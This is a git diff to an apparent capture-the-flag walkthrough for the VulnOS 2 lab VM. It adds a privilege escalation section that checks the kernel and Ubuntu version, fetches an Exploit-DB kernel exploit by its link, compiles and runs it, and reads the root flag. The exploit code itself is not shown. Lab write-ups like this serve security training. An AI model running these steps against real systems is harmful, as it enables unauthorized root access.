@@ -106,4 +106,29 @@
         - `/bin/bash -i`  
 
 ## Privilege Escalation  
-1. 
+1. Investigate the server information  
+    * Search kernel and Ubuntu version  
+    ![Kernel-Ubuntu](./img/vulnos2_server10.png)  
+        - `uname -r`  
+        - `cat /etc/lsb-release`  
+
+1. Search the Ubuntu exploit  
+    * Search "Ubuntu 14.04 LTS exploit" from Web browser  
+    * Copy the exploit source code (https://www.exploit-db.com/exploits/37292)  
+    * Make the exploit program  
+        - `mkdir tmp`  
+        - `cd tmp`  
+        - `cat > priv.c`  
+        
+
+1. Do privilege escalation  
+    * Execute the exploit code  
+    ![Privilege-Escalation](./img/vulnos2_server11.png)  
+        - `gcc -o priv priv.c`  
+        - `chmod +x priv`  
+        - `./priv`  
+
+## Credential Access  
+1. Open the root flag file  
+    * Open the flag.txt  
+    ![Root-flag](./img/vulnos2_server12.png)  
